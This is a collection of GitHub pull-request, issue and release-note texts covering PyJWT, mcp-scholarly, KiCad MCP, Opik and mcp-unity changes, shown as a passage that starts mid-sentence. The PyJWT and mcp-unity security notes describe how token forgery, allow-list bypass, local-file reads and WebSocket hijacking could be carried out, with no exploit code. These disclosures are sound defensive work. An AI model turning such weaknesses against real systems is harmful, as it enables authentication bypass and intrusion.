payload segment when b64=false . For detached-payload JWS ( b64=false ), the compact-form payload segment was base64-decoded before being discarded in favor of the caller-supplied detached_payload . An attacker could inflate the unused segment to force CPU + memory cost without holding a valid signature. The segment is now required to be empty per RFC 7515 Appendix F, and is no longer decoded. Reported by @​thesmartshadow . GHSA-993g-76c3-p5m4 — PyJWKClient accepts non-HTTP(S) URIs. PyJWKClient.fetch_data passed its URI to urllib.request.urlopen , which by default also handles file:// , ftp:// , and data: schemes. An application that fed an attacker-influenced URI into PyJWKClient could be coerced into reading local files or reaching other unintended schemes. PyJWKClient now rejects any URI whose scheme isn't http or https . Reported by @​KEIJOT . GHSA-fhv5-28vv-h8m8 — PyJWKClient cache wiped on fetch error. A finally -block put(jwk_set=None) cleared the JWK Set cache whenever a fetch raised, turning a transient JWKS-endpoint outage into application-wide auth failure. The cache write was moved into the success path; transient errors no longer evict valid cached keys. Reported by @​eddieran . Fixed Reject empty HMAC keys outright in HMACAlgorithm.prepare_key with InvalidKeyError instead of accepting them with only a warning. Defends against the os.getenv("JWT_SECRET", "") footgun. Thanks to @​SnailSploit and @​spartan8806 for the reports. Forward per-call options (including enforce_minimum_key_length ) from PyJWT.decode through to PyJWS._verify_signature . The option was previously silently dropped between the two layers, so it only took effect when set on the PyJWT instance. Thanks to @​WLUB for the report. RFC 7797 §3 compliance for b64=false : the encoder now auto-adds "b64" to crit , and the decoder rejects tokens that set b64=false without listing it in crit . Thanks to @​MachineLearning-Nerd for the report. Changed Migrate the dev , docs , and tests package extras to dependency groups, by @​kurtmckee in #1152 . Upgrade notes Most fixes are invisible to correctly-configured callers. A few behavioral changes you may encounter: Empty HMAC keys now raise. If your app passed "" or b"" as a secret (often via a missing env var, e.g. os.getenv("JWT_SECRET", "") ), encode / decode will now raise InvalidKeyError . This is the intended behavior — fix the configuration. PyJWK decoding now requires the token's alg to match the JWK's algorithm. Previously a mismatch was silently honored if the header alg appeared in the allow-list. Tokens that relied on this mismatch will now fail with InvalidAlgorithmError . PyJWKClient now rejects non-HTTP(S) URIs at construction time. Tests or dev environments that fetched JWKS from file:// URIs need to switch to a local HTTP server or load the JWKS by other means (e.g. construct PyJWKSet.from_dict(...) directly). b64=false tokens are now strictly RFC 7515 / 7797 compliant. Tokens with a non-empty compact-form payload segment, or that omit "b64" from crit , will be rejected. title: chore(deps): bump pyjwt from 2.12.0 to 2.13.0
cleaned_text: chore(deps): bump pyjwt from 2.12.0 to 2.13.0 Bumps pyjwt from 2.12.0 to 2.13.0. Release notes Sourced from pyjwt's releases . 2.13.0 PyJWT 2.13.0 — Security Release This release bundles five security fixes plus three additional hardening / spec-compliance changes. We recommend all users upgrade. Security GHSA-xgmm-8j9v-c9wx — JWK JSON accepted as HMAC secret (algorithm confusion). HMACAlgorithm.prepare_key previously rejected PEM- and SSH-formatted asymmetric keys but did not catch a JWK passed as a raw JSON string. In a verifier configured with both symmetric and asymmetric algorithms in algorithms=[…] and a raw-JSON JWK as the key, an attacker could forge HS256 tokens using the JWK text as the HMAC secret. The guard has been extended to reject any JWK-shaped JSON. Reported by @​aradona91 . GHSA-jq35-7prp-9v3f — Algorithm allow-list bypass with PyJWK / PyJWKClient . When verifying with a PyJWK , the caller's algorithms=[…] allow-list was checked against the token header alg as a string only; actual verification used the algorithm bound to the PyJWK . An attacker who controlled a registered JWKS key could sign with one algorithm and advertise another on the header. PyJWT now requires the token header alg to match the PyJWK 's algorithm before verification. Reported by @​sushi-gif . GHSA-w7vc-732c-9m39 — DoS via base64 decode of unused payload segment when b64=false . For detached-payload JWS ( b64=false ), the compact-form payload segment was base64-decoded before being discarded in favor of the caller-supplied detached_payload . An attacker could inflate the unused segment to force CPU + memory cost without holding a valid signature. The segment is now required to be empty per RFC 7515 Appendix F, and is no longer decoded. Reported by @​thesmartshadow . GHSA-993g-76c3-p5m4 — PyJWKClient accepts non-HTTP(S) URIs. PyJWKClient.fetch_data passed its URI to urllib.request.urlopen , which by default also handles file:// , ftp:// , and data: schemes. An application that fed an attacker-influenced URI into PyJWKClient could be coerced into reading local files or reaching other unintended schemes. PyJWKClient now rejects any URI whose scheme isn't http or https . Reported by @​KEIJOT . GHSA-fhv5-28vv-h8m8 — PyJWKClient cache wiped on fetch error. A finally -block put(jwk_set=None) cleared the JWK Set cache whenever a fetch raised, turning a transient JWKS-endpoint outage into application-wide auth failure. The cache write was moved into the success path; transient errors no longer evict valid cached keys. Reported by @​eddieran . Fixed Reject empty HMAC keys outright in HMACAlgorithm.prepare_key with InvalidKeyError instead of accepting them with only a warning. Defends against the os.getenv("JWT_SECRET", "") footgun. Thanks to @​SnailSploit and @​spartan8806 for the reports. Forward per-call options (including enforce_minimum_key_length ) from PyJWT.decode through to PyJWS._verify_signature . The option was previously silently dropped between the two layers, so it only took effect when set on the PyJWT instance. Thanks to @​WLUB for the report. RFC 7797 §3 compliance for b64=false : the encoder now auto-adds "b64" to crit , and the decoder rejects tokens that set b64=false without listing it in crit . Thanks to @​MachineLearning-Nerd for the report. Changed Migrate the dev , docs , and tests package extras to dependency groups, by @​kurtmckee in #1152 . Upgrade notes Most fixes are invisible to correctly-configured callers. A few behavioral changes you may encounter: Empty HMAC keys now raise. If your app passed "" or b"" as a secret (often via a missing env var, e.g. os.getenv("JWT_SECRET", "") ), encode / decode will now raise InvalidKeyError . This is the intended behavior — fix the configuration. PyJWK decoding now requires the token's alg to match the JWK's algorithm. Previously a mismatch was silently honored if the header alg appeared in the allow-list. Tokens that relied on this mismatch will now fail with InvalidAlgorithmError . PyJWKClient now rejects non-HTTP(S) URIs at construction time. Tests or dev environments that fetched JWKS from file:// URIs need to switch to a local HTTP server or load the JWKS by other means (e.g. construct PyJWKSet.from_dict(...) directly). b64=false tokens are now strictly RFC 7515 / 7797 compliant. Tokens with a non-empty compact-form payload segment, or that omit "b64" from crit , will be rejected. PyJWT-produced tokens always satisfy both invariants, so round-trips through PyJWT are unaffected. enforce_minimum_key_length set per-call now takes effect. Callers who passed options={"enforce_minimum_key_length": True} to jwt.decode() previously got no enforcement; they will now get InvalidKeyError on undersized keys, as documented. Full changelog: https://github.com/jpadilla/pyjwt/compare/2.12.1...2.13.0 2.12.1 What's Changed Add typing_extensions dependency for Python < 3.11 by @​jpadilla in jpadilla/pyjwt#1151 Full Changelog : https://github.com/jpadilla/pyjwt/compare/2.12.0...2.12.1 Changelog Sourced from pyjwt's changelog . v2.13.0 Security Reject JWK JSON documents passed as raw HMAC secrets in HMACAlgorithm.prepare_key to close an algorithm-confusion gap that the existing PEM/SSH guard did not cover. title: test: cover TOOL_PREFIX tool and server naming

title: feat: add SerpBase (Google) search engine via REST API
cleaned_text: feat: add SerpBase (Google) search engine via REST API Summary Adds an optional search-google-web MCP tool to mcp-scholarly, backed by the SerpBase REST API (https://serpbase.dev). It complements the existing search-arxiv and search-google-scholar tools with plain Google web search — useful for finding preprints, blog posts, and general web sources around a research keyword. Background The README already notes that Google Scholar scraping is fragile (the google_scholar.py file routes through a rotating free proxy pool to dodge Google's datacenter-IP blocks and retries with exponential backoff). A REST API provider removes that fragility entirely for users who want reliable results, and it does so without touching the existing free path. Changes New : src/mcp_scholarly/serpbase_search.py — SerpBaseSearch class: POSTs {q, hl, gl, page} to https://api.serpbase.dev/google/search with an X-API-Key header, formats organic results into the same Title/Summary/URL blocks the other providers produce. Updated : src/mcp_scholarly/server.py — registers the search-google-web tool with the same keyword-validation pattern as the other tools. Updated : README.md — documents the new tool and the SERPBASE_API_KEY env var. Updated : pyproject.toml — adds httpx>=0.27.0 (already a transitive dependency of scholarly ; no new package is actually pulled in). New : tests/test_serpbase_search.py — 16 tests; suite stays at 100% branch coverage. Design decisions Decision | Rationale API key via SERPBASE_API_KEY env var | Follows the existing SCHOLAR_MAX_RETRIES env-var convention; zero config when unset Graceful skip when key missing | Server starts and behaves exactly as before; tool returns empty result set instead of crashing httpx.Client reused | Matches the project's existing HTTP stack (scholarly already depends on httpx); no new dependency Same Title/Summary/URL output shape | Keeps tool output consistent with search-arxiv / search-google-scholar so downstream parsers (e.g. zorp) treat all tools alike Testing python -m pytest tests/ -q → 55 passed , total coverage 100% (fail-under=100 enforced by the project's pytest config). With SERPBASE_API_KEY unset: SerpBaseSearch.available is False , search() returns [] , server unchanged. With key set: results are parsed and formatted; HTTP errors and non-zero API status raise clearly; the client is always closed. The search-google-web tool is registered unconditionally but degrades to "No results" without a key — matching the zero-config expectation of existing users. Related No open issue references — this is a standalone enhancement. Happy to adjust the tool name, description, or result formatting to match project conventions.

title: Rank by relevance and trim payloads, for use as a zorp evidence source
cleaned_text: Rank by relevance and trim payloads, for use as a zorp evidence source Measured against zorp's MCP transport rather than assumed. zorp's validate needs a search-capable MCP tool before it will run, and this server satisfies that check, so these are the changes that make it a good one. Relevance, not submission date arxiv_search sorted by SubmittedDate . A research agent asking "has this been done before" wants the closest prior work, and date order answers a different question. Concretely, "transformer attention" returned a recent unrelated agent-harness paper above *Dilated Neighborhood Attention Transformer*. Payload halved arXiv abstracts run ~1,600 characters and the tool returned ten of them, about 17KB per call . zorp issues several searches per validate run and is designed to work against small local models, where that is a large share of the context window. Summaries are now capped at 700 characters: 17,088 → 9,152 chars , measured through the MCP interface. What this does not fix, stated plainly arXiv returns best-effort matches for any query, so a nonsense keyword still comes back with papers. Relevance ordering changes *which* papers arrive, not *whether* any do. A caller scoring novelty must not read "results came back" as "prior work exists", so the tool description now says exactly that, which is the text the model actually reads. Verified against zorp's transport Driven the way zorp drives it: newline-delimited JSON on stdin, initialize then tools/list then tools/call . Check | Result search-arxiv latency | ~1s, well inside zorp's 30s read budget stdout purity | clean; all logging on stderr, so nothing corrupts the framing Empty keyword | MCP tool error, not an empty result set README gains a "Using with zorp" section with the working --mcp line and a .zorp/mcp.toml block, including timeout_secs = 60 as headroom for the google-scholar path, which goes through a free proxy pool and is far less predictable than arXiv. 42 tests, branch coverage still 100%.

title: Fix Google Scholar fetch failures, upgrade to mcp SDK 2.0.0, add test suite (100% coverage)
cleaned_text: Fix Google Scholar fetch failures, upgrade to mcp SDK 2.0.0, add test suite (100% coverage) Summary Fixes #11 ( MCP error -32001: fetch failed on search-google-scholar ), plus an SDK upgrade and a new test suite. Google Scholar fetch failure (#11) Google Scholar blocks most requests coming directly from datacenter/cloud IPs with a CAPTCHA, which scholarly surfaces as a generic fetch failure. The free-proxy package was already declared as a dependency in pyproject.toml but was never actually wired up in the code — every request hit Google Scholar directly and got blocked. GoogleScholar now configures scholarly 's ProxyGenerator with a free proxy once per process (via pg.FreeProxies() + scholarly.use_proxy() ), falling back to a direct connection if no working proxy can be found. Lowered the shared retry defaults (previously 50 retries with a 30s backoff cap, added in #14) to 3 retries / 10s cap. MCP clients enforce their own request timeout, so retrying for minutes just delays the same eventual failure until after the client has already timed out — it doesn't actually help. The retry ceiling stays configurable via SCHOLAR_MAX_RETRIES for anyone who wants more. Upgrade to mcp SDK 2.0.0 The project was pinned to mcp>=1.1.2 (locked to that exact version in uv.lock ) and used the low-level Server / list_tools / call_tool API, which had already drifted from the current low-level API in newer SDK releases. First migrated server.py to mcp.server.fastmcp.FastMCP with declarative @mcp.tool() decorators (bumping to the latest stable 1.x release, 1.29.0), replacing the manual JSON-schema tool definitions and dispatch logic. Then upgraded straight through to mcp 2.0.0. In 2.0.0, FastMCP is renamed to MCPServer (moved from mcp.server.fastmcp to mcp.server.mcpserver ), but keeps the exact same public API used here ( tool() , call_tool() , list_tools() , run_stdio_async() ) — so the final change is a one-line swap of the import and constructor, no behavior change. pyproject.toml now requires mcp>=2.0.0 , locked to 2.0.0 in uv.lock . Test suite (100% branch coverage) Added a tests/ suite covering google_scholar.py , arxiv_search.py , server.py , and the package entry point ( init .py ): retry/backoff config parsing ( SCHOLAR_MAX_RETRIES unset/empty/valid/negative/non-numeric) the free-proxy setup added for #11 — successful proxy, no working proxy found, setup raising an exception, and the once-per-process guard result parsing and the MAX_RESULTS truncation for both search backends the retry-then-succeed and exhausted-retries paths for both GoogleScholar.search_pubs and ArxivSearch.search tool input validation ( Missing keyword ) and dispatch in server.py main() wiring in both server.py and init .py All external calls ( scholarly , arxiv , ProxyGenerator , time.sleep ) are mocked, so the suite runs offline and deterministically — no dependency on live Google Scholar/arXiv access. Added pytest , pytest-asyncio , and pytest-cov as a dev dependency group, and configured pytest ( [tool.pytest.ini_options] ) to run with branch coverage and fail under 100% by default — uv run pytest now enforces the coverage gate on its own. The retry loops' theoretically-unreachable "loop exhausts naturally without ever hitting break " arm is marked # pragma: no branch — max_retries is always >= 0 so the loop runs at least once, and if every attempt fails the last iteration's attempt >= max_retries check is always true, so break always fires before the iterator would otherwise exhaust. This is a coverage.py branch-model artifact, not an untested behavior. Test plan [x] uv run pytest — 37 tests, 100% branch coverage, coverage gate passes [x] uv lock / uv sync succeed with mcp 2.0.0 and the new dev dependency group [x] Verified both tools ( search-arxiv , search-google-scholar ) register correctly under MCPServer.list_tools() [x] Verified MCPServer.call_tool() correctly dispatches to each tool, propagates our ValueError("Missing keyword") validation, and wraps underlying exceptions in ToolError [ ] Manual end-to-end run of both tools against live Google Scholar / arXiv (this sandboxed environment's network policy blocks outbound requests to those hosts, so live results couldn't be confirmed here — this is exactly why the test suite mocks those calls)

title: Fix fastmcp context injection + add end-to-end PCB workflow (authoring, update-from-schematic, autoroute, IPC, fabrication)
cleaned_text: Fix fastmcp context injection + add end-to-end PCB workflow (authoring, update-from-schematic, autoroute, IPC, fabrication) Summary This PR fixes a server-wide bug that broke every context-taking tool, then builds an end-to-end PCB workflow on top of the MCP: schematic authoring, "update PCB from schematic", autorouting (via Freerouting), live board editing over KiCad's IPC API, and fabrication outputs. Bug fix (blocking) The server runs on the standalone fastmcp v2 package, but the tools imported Context from the low-level mcp.server.fastmcp package — a *different* Context class. fastmcp v2 therefore never recognized the parameter for injection: it exposed ctx as a required input and then failed at call time with *"Context is not available outside of a request"*. This broke netlist, DRC, BOM, pattern and thumbnail tools. Fixed by importing Context / Image from fastmcp and annotating injected params as bare Context . A second bug (project-level tools calling sibling @mcp.tool() -decorated functions directly — a FunctionTool is not callable) is fixed by extracting shared module-level helpers. New capabilities Schematic authoring ( kicad_mcp/utils/sexpr.py , sexpr_author.py , tools/authoring_tools.py ) create_project (2–32 copper layers), add_schematic_component (loads any symbol from the standard libraries, returns absolute pin coordinates), add_schematic_wire , add_schematic_label . Small dependency-free S-expression reader/writer; no running KiCad required. title: [OPIK-8793] [GHA] feat: auto-convert PRs with merge conflicts to draft
cleaned_text: [OPIK-8793] [GHA] feat: auto-convert PRs with merge conflicts to draft Details Reviewers keep opening PRs that look ready but conflict with main , so the code will change before it can merge. This adds a 🚦 Draft PR Policy workflow that converts a ready-for-review PR with merge conflicts back to draft , so its draft state shows whether it's actually ready. No comment is posted. Triggers : pull_request (opened/reopened/synchronize/ready_for_review) and an hourly schedule . The schedule catches conflicts caused by other merges to the base branch, which fire no event on the PR itself. Getting back to ready is manual: the author resolves the conflicts and clicks "Ready for review", which re-runs the check. Skipped : draft, closed, merged, fork ( isCrossRepository ), and bot-authored PRs. GitHub computes mergeability lazily, so UNKNOWN is retried 6× at 5s intervals. If it's still unknown, the PR is skipped for that run and the next trigger or the schedule picks it up. workflow_dispatch with dry_run (default true ) only logs which open PRs would be converted. Use it to check the impact before relying on the schedule. Hardening: top-level permissions: {} and job-level pull-requests: write only. No ${{ }} expressions in the script. Per-PR concurrency group. Scope: this is the MVP half of a split ticket. Converting PRs with unaddressed review threads (Baz or human) has edge cases to decide first, so it moved to a follow-up (OPIK_8853). The first commit on this branch has a first cut of that logic for the follow-up to start from. The second commit trims it back to conflicts only. title: [issue-9008] [SDK] fix: keep tool_use and thinking blocks in Bedrock invoke_model Claude streams
cleaned_text: [issue-9008] [SDK] fix: keep tool_use and thinking blocks in Bedrock invoke_model Claude streams Details ClaudeAggregator , used by track_bedrock for Claude responses from invoke_model_with_response_stream , only collected delta.text . Streamed tool_use and thinking blocks were missing from the span output. A tool-only turn was logged as content: [] with stop_reason: "tool_use" , while the non-streamed invoke_model keeps those blocks. Content blocks are now tracked by index . content_block_start records the block (the tool_use id / name , or a thinking block), and each content_block_delta is applied to the block with the same index: text , thinking , signature , or partial_json for tool input. Once the stream ends, the tool input is parsed with json.loads . An empty input becomes {} (Claude streams a no-argument call as "" ), and input that doesn't parse, such as a call cut off by max_tokens , is kept as the raw string. This matches _parse_tool_input in the Converse aggregator. Blocks are emitted in index order. Empty text blocks are still left out, as before, and usage handling is unchanged. Not in this PR: nova.py (Nova toolUse ) and openai.py ( delta.tool_calls for gpt-oss) have the same gap in their invoke_model aggregators. They can follow separately. title: ConversationalCoherenceMetric grades empty assistant replies as incoherent answers
cleaned_text: ConversationalCoherenceMetric grades empty assistant replies as incoherent answers Bug ConversationalCoherenceMetric grades conversation windows that end with an assistant message even when that message carries no text. An agent turn that only issued tool calls (or an empty completion) arrives as {"role": "assistant", "content": ""} and is then sent to the judge: it burns a model call, counts in the denominator, and an empty reply is inevitably scored as incoherent. Symptoms A fully coherent thread whose last agent turn has no text scores 0.5 instead of 1.0. A thread whose agent turns are all empty scores 0.0 with scoring_failed=False instead of raising MetricComputationError , contradicting the metric docstring ("raises rather than scoring it as incoherent"). The score is written to the thread as feedback score, indistinguishable from a genuinely incoherent conversation. Reproduction Conversation [user, assistant("It is 5% of the overdraw amount."), user, assistant("")] scored with ConversationalCoherenceMetric : two windows are graded (two judge calls) and the score is 0.5; without the empty turn it is 1.0. create_conversation_from_traces produces the empty-text assistant message when a trace's output is "" (it only skips None outputs). Proposed fix Require the closing assistant message to carry text before grading a window, aligning with g_eval_wrappers._latest_assistant_text (#8403); when no gradeable window remains, keep the existing MetricComputationError . A PR with regressions for both shapes follows.

title: [issue-4521] [SDK] Fix @track not detecting async functions wrapped by multiple decorators
cleaned_text: [issue-4521] [SDK] Fix @track not detecting async functions wrapped by multiple decorators Details The is_async helper in inspect_helpers.py only checked one level of the wrapped chain. When an async function is wrapped by two or more synchronous functools.wraps -based decorators, the check saw only the intermediate (non-coroutine) wrapper and treated the function as synchronous. This caused @track to skip the async code path and return a plain coroutine object instead of awaiting it, breaking callers on Python 3.11 where inspect.iscoroutinefunction does not recursively walk wrapped on its own (Python 3.12+ does, but 3.11 does not). The fix walks the entire wrapped chain with a cycle guard until a coroutinefunction is found or the chain is exhausted. Documentation No documentation change needed.

title: [NA] [SDK] fix: report failed dataset and prompt exports as errors
cleaned_text: [NA] [SDK] fix: report failed dataset and prompt exports as errors Details opik export reports a dataset or prompt that failed to export as skipped, and exits 0. export_single_dataset ( cli/exports/dataset.py ) and export_single_prompt ( cli/exports/prompt.py ) catch any exception, print it and return 0 , which is also what they return when the file already exists. So after a failed dataset export, opik export WS PROJECT dataset NAME prints "Dataset 'NAME' already exists (use --force to re-download)" and exits 0. opik export WS PROJECT all prints "Export complete." and exits 0, with no file for that dataset in the export. This follows @dsblank's export audit in #7278, and his earlier had_errors work in #6087. In #7278, export_experiment_by_id was changed to re-raise, and _export_all_prompts got an error counter that feeds had_errors . That counter never sees a failure inside export_single_prompt , because the function catches it and returns 0, so the failure is counted as skipped. _export_all_datasets has no error counter at all. export_single_dataset and export_single_prompt print the error and re-raise, as export_experiment_by_id does. A file that already exists is still skipped and returns 0. _export_all_datasets returns (exported, skipped, errors) , as _export_all_prompts already does. A failed listing counts as one error, and export_all sets any_errors from it. The loop's existing except now counts the error, so the other datasets still export. The "completed with errors" line in export_all now names datasets and prompts as well as traces and experiments. A prompt the listing returned but whose lookup raised was also counted as skipped in _export_all_prompts , and export_prompt_by_name printed "not found" and exited 0. get_prompt returns None for a missing prompt, so a raised lookup is a failure: it is now counted as an error, and export_prompt_by_name re-raises to its existing exit-1 handler. A missing prompt is still skipped. (Flagged by the Baz review on this PR.) Intended behaviour change: a dataset or prompt that cannot be read or written now makes the command exit 1, where before it exited 0. Success and skip are unchanged. The error is printed twice (once by the helper, once by the caller), the same as for experiments today. cleaned_text: [OPIK-7980] [BE] [SDK] feat: store an explicit evaluator_revision with feedback scores Details Reworked after review. Instead of persisting the whole ScoreResult.metadata , a score now carries one explicit, caller-supplied evaluator_revision (up to 256 characters), and it can be read back in this same PR. title: Release 1.5.0
cleaned_text: 🔐 Security Fixed cross-site WebSocket hijacking against the Unity Editor bridge. Browser-originated handshakes are now rejected, and every native bridge connection must authenticate with a per-project 256-bit token ( 382a43a ). Added strict token discovery through MCP_UNITY_AUTH_TOKEN , MCP_UNITY_AUTH_TOKEN_PATH , or Library/McpUnity/bridge-token , with fail-closed handling for missing or malformed explicit credentials. Disabled add_package by default because installed packages can execute Editor code during compilation. Package installation now requires an explicit trusted-project opt-in and remains unavailable in batch mode. 🆕 What is New Added authentication status, token copy and rotation controls, package-install opt-in, and remote plaintext transport warnings to the MCP Unity Server Window. Added authenticated MCP configuration generation for JSON, OpenCode, and TOML clients without embedding the token itself. Added opt-in support for persistent headless MCP hosts through AllowBatchModeServer or MCP_UNITY_ALLOW_BATCH_MODE=true , while keeping ordinary CI and cloud builds disabled by default ( 46b6697 ). 🛠️ What Was Fixed Kept a WebSocket error listener attached during connection termination so the Node bridge no longer exits on its first connection timeout (#155). Added generation-aware liveness detection for a Windows socket that binds successfully but never services requests, with careful timeout and shutdown-race handling (#156, #141). Made bridge configuration discovery independent of the MCP client's working directory, added explicit source diagnostics, and hardened port, host, timeout, and settings-file validation ( 46b6697 ). 🔄 What Changed Breaking security migration: 1.4.x Node bridges and unauthenticated direct WebSocket clients can no longer connect. Upgrade both package components, regenerate MCP client configuration from Unity when needed, and restart every MCP client process. Direct WebSocket integrations must use HTTP Basic credentials as mcp-unity: and omit the Origin header. Remote connections remain plaintext ws:// and should only be used on a trusted network, VPN, or SSH tunnel. Synchronized the Unity package, Node package and lockfile, MCP runtime, dashboard, and Unity Server Window versions at 1.5.0 . Expanded Unity and Node coverage for token lifecycle, Origin rejection, authentication failures, package-install policy, configuration resolution, and release metadata. New Contributors @TenaciousLibbs made their first contribution in https://github.com/CoderGamester/mcp-unity/pull/155 Full Changelog : https://github.com/CoderGamester/mcp-unity/compare/1.4.0...1.5.0

title: fix: release the WebSocket listener even when CloseAllClients throws (fixes #141)
cleaned_text: fix: release the WebSocket listener even when CloseAllClients throws (fixes #141) fix: release the WebSocket listener even when CloseAllClients throws Fixes the root cause behind #141 ( Failed to start WebSocket server: Port is already in use , cleared only by restarting Unity). Target : CoderGamester/mcp-unity @ 382a43a (v1.5.0) Patch : mcp-unity-port-leak-fix.patch (single file: Editor/UnityBridge/McpUnityServer.cs ) Root cause McpUnityServer.StopServer() closes clients and the listener inside one try block, and then clears the field in finally : try { CloseAllClients(closeCode ?? 1000, closeReason ?? "Server stopping"); // ← can throw _webSocketServer?.Stop(); // ← then never runs } catch (Exception ex) { McpLogger.LogError(...); } finally { _webSocketServer = null; // ← reference dropped _socketOwner = null; Clients.Clear(); } CloseAllClients walks live sessions and calls Close(...) on each one. When a client is in a half-closed state ( CLOSE_WAIT — exactly what happens when the MCP client times out and drops the socket during a reload) it throws. The exception is swallowed, so: WebSocketServer.Stop() is never called → the underlying TcpListener stays bound. finally drops the only reference to the server object. The domain then unloads; finalizers do not run for objects in an unloaded AppDomain , so the socket handle is only released when the editor process exits . From that point the port is permanently "alive but unserviced": TCP connects succeed (kernel backlog) while every WebSocket handshake hangs, and every later bind fails with AddressAlreadyInUse ( WSAEACCES in some Windows states). Only restarting Unity clears it — the behaviour reported in #141. The liveness probe added for #141 correctly detects this state, but as its own remarks state, it deliberately does not repair it; the repair has to happen before the socket is orphaned. Evidence Instrumented with file-based lifecycle logging ( Debug.Log output is dropped during domain reload): beforeAssemblyReload: instance=True, owner=True, ownerListening=True StopServer enter: server=True, listening=True ForceCloseListener: type=TcpListener, wasBound=False <-- Stop() had been skipped and, on the next start attempt, ForceCloseAllKnownListeners: known=1, closed=0 with the port still held by the process — i.e. the bound socket was no longer reachable from any managed object. Changes StopServer() — close the listener unconditionally. Client shutdown, server.Stop() and the explicit listener close each get their own try / catch ; the listener is always released before the fields are cleared. This is the actual fix. ForceCloseListener() — closes the listener even if Stop() was a no-op or threw, by taking WebSocketServer._listener ( TcpListener ) via reflection and calling Stop() + Socket.Close() . Also called from CleanupFailedStart() . _socketOwner + OnBeforeAssemblyReload — the reload hook no longer depends on the singleton being alive; if the singleton is gone it closes the recorded socket directly. _knownServers + ForceCloseAllKnownListeners() — every server created in the domain is tracked, so a start failure can reclaim a listener that an earlier failed start left behind. Retry budget — DelayedStartMaxAttempts 10 → 150 with longer tail delays (≈15 min instead of ~32 s). A listener held by a just-killed editor process can take minutes to disappear on Windows; the server now waits for it instead of giving up. SocketError.AccessDenied is retried too — Windows reports WSAEACCES rather than AddressAlreadyInUse when the port is held by a socket created with SO_EXCLUSIVEADDRUSE . Optional diagnostics — lifecycle trace to Temp/mcp_bridge_diag.log . Reviewers may drop this ; it is independent of the fix. WebSocketServer.ReuseAddress was evaluated and deliberately *not* enabled: it produces WSAEACCES , and new connections can be delivered to the stale listener. Verification (Unity 6.3 LTS / 6000.3.23f1, Windows 11) Scenario | Before | After Script recompile (domain reload) | port leaked, MCP dead until editor restart | beforeAssemblyReload → StopServer → rebind 1.2 s later ✅ Enter Play Mode | port leaked | rebind 4 s later ✅ Exit Play Mode | port leaked | bridge stays up ✅ Editor process restarted | port unusable for minutes, no recovery | old socket released ≈3 min later, retry binds automatically ✅ How to test Apply the patch, open Unity with the package installed ( AutoStartServer: true ). Confirm the MCP client connects. Trigger a script recompile ( recompile_scripts or just edit a script) and immediately retry an MCP call — it must succeed within a few seconds. Enter and exit Play Mode, retry — it must still succeed. netstat -ano | findstr 8090 should show exactly one LISTENING socket owned by the editor, and Temp/mcp_bridge_diag.log (if diagnostics kept) should show START OK: ... listenerBound=True after each reload.

title: UnityObjectId synthetic ids don't survive domain reloads and can't resolve externally-known instance ids
cleaned_text: UnityObjectId synthetic ids don't survive domain reloads and can't resolve externally-known instance ids UnityObjectId (added in 1.4.0) maps EntityIds to synthetic sequential ids held in static dictionaries. Two practical problems on Unity 6 ( MCP_UNITY_ENTITY_ID_API ): Domain reloads wipe the maps. Any id a client obtained before entering Play Mode (or before a recompile) resolves to null afterwards, so an agent's cached ids silently die at exactly the moments (play-mode testing, script edits) where MCP automation is most active. ObjectFromId can only resolve ids the server has previously handed out. An instance id from any other source — another tool, a log line, a serialized reference — returns null even when the object exists. An alternative that avoids both: convert directly between the legacy int id and EntityId ( EntityId.FromULong(unchecked((ulong)id)) / unchecked((int)EntityId.ToULong(entityId)) , resolving via EditorUtility.EntityIdToObject ). Ids stay real Unity instance ids — stable across reloads and interoperable with anything else that reports instance ids — with no session state. We've been running this in a fork without issues. Happy to PR it if you're open to the change; flagging as an issue first since the synthetic-id map looks like a deliberate choice. 🤖 Generated with Claude Code
